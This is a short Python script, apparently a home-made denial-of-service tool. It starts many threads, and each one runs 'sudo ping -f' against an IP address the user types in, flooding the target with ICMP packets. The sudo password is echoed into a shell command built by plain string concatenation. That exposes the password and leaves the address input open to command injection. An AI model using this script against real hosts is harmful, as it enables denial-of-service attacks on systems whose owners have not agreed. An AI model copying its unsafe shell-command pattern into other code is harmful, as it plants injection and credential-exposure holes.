import os
import threading
import urllib
import requests

def startAttack(ipAddress, password):
        os.system("echo " + password + " | sudo ping -f " + ipAddress)

if __name__ == "__main__":
    numThreads = input("Enter the number of threads to create")
    numThreads = int(numThreads)
    #assert type(numThreads) == int
    ipAddress = input("Enter ip address")
    ipAddress = str(ipAddress)
    #assert type(ipAddress) == str
    iterations = input("Enter number of floods")
    iterations = int(iterations)
    #assert type(ipAddress) == int
    password = input("Password: ")
    password = str(password)
    threads = []

    for i in range(numThreads):
        threads.append(threading.Thread(target=startAttack, kwargs = {'ipAddress':ipAddress, 'password':password}, name='startAttack'))

    for thread in threads:
        thread.start()




